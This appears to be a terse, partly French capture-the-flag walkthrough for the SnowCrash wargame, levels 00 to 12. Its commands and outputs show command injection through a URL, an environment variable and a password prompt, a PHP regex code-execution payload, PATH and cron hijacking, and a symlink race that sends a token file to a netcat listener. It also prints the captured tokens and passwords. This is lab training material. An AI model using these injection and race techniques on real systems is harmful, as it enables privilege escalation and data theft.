flag00:nottoohardhere (cmd: find / -user flag00 gives us /usr/sbin/john -> rot11) (see intra video)

flag01:abcdefg (./john passwd -> cat /etc/paswd flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash)

flag02:ft_waNDReL0L (level02.pcap password clair) -> scp -P4242 level02@ip_address:/home/user/level02/level02.pcap .

flag03: spawn shell (cat /tmp/echo -> #!/bin/sh sh, puis on change la perm pour qu'il soit executable et on export PATH=/tmp:$PATH + getflag dans shell de flag03)

flag04: http://172.20.10.6:4747/?x=`getflag`

flag05:
level05@SnowCrash:/var/mail$ cat level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:/usr/sbin$ cat openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:/opt/openarenaserver$ echo "getflag >> /tmp/flag05" >> script
level05@SnowCrash:/opt/openarenaserver$ cat script
getflag >> /tmp/flag05
level05@SnowCrash:/opt/openarenaserver$ ls
script
level05@SnowCrash:/opt/openarenaserver$ ls (apres deux minutes max, le script s'execute avec le groupe flag05 et le script est removed du dossier)
level05@SnowCrash:/opt/openarenaserver$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc

flag06:
level06@SnowCrash:~$ echo '[x {$y}]' >/tmp/getflag
level06@SnowCrash:~$ ./level06 /tmp/getflag flag06
/tmp/getflag
level06@SnowCrash:~$ echo '[x {${system(sh)}}]' >/tmp/getflag
level06@SnowCrash:~$ ./level06 /tmp/getflag flag06
PHP Notice:  Use of undefined constant sh - assumed 'sh' in /home/user/level06/level06.php(4) : regexp code on line 1
getflag
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub

flag07:
level07@SnowCrash:~$ export LOGNAME=";getflag;"
level07@SnowCrash:~$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

flag08:
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/key
level08@SnowCrash:~$ ls -la /tmp/key
lrwxrwxrwx 1 level08 level08 24 Dec 10 16:48 /tmp/key -> /home/user/level08/token
level08@SnowCrash:~$ /tmp/key
-bash: /tmp/key: Permission denied
level08@SnowCrash:~$ ./level08 /tmp/key
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

flag09:
create python script: test.py
import sys

string = sys.argv[1]
key = 0
result = ''
for char in string:
    result += chr(ord(char) + key)
    key -= 1

print '\nResult: {res}'.format(res = result)
level09@SnowCrash:~$ python /tmp/test.py $(cat token)
Result: f3iji1ju5yuevaus41q1afiuq
level09@SnowCrash:~$ su flag09
Password:
Don't forget to launch getflag !
flag09@SnowCrash:~$ getflag
Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z

flag10:
access race-condition exploit
first open port 6969 with nc -lk 6969
level10@SnowCrash:~$ ls -l level10 token
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
level10@SnowCrash:~$ while true; do ln -sf /home/user/level10/token /tmp/key; ln -sf /home/user/level10/level10 /tmp/key; done &
level10@SnowCrash:~$ while true; do ./level10 /tmp/key 10.12.1.113; done
You don't have access to /tmp/key
Connecting to 10.12.1.113:6969 .. Connected!
Sending file .. wrote file!
woupa2yuojeeaaed06riuj63c
level10@SnowCrash:~$ su flag11
Password:
Don't forget to launch getflag !
flag11@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c

flag11:
level11@SnowCrash:~$ ./level11.lua
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
level11@SnowCrash:~$ netstat -ltnp
(No info could be read for "-p": geteuid()=2011 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::4646                 :::*                    LISTEN      -
tcp6       0      0 :::4747                 :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::4242                 :::*                    LISTEN      -
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: 1;/bin/getflag > /tmp/level12;echo 1
Erf nope..
level11@SnowCrash:~$ cat /tmp/level12
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

flag12:
level12@SnowCrash:~$ cat /tmp/TOKEN
#!/bin/sh
getflag > /tmp/key
level12@SnowCrash:~$ ./level12.pl "?x="`/*/TOKEN`""
/tmp/TOKEN: 2: /tmp/TOKEN: cannot create /tmp/key: Permission denied
Content-type: text/html

..level12@SnowCrash:~$ cat /tmp/key
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
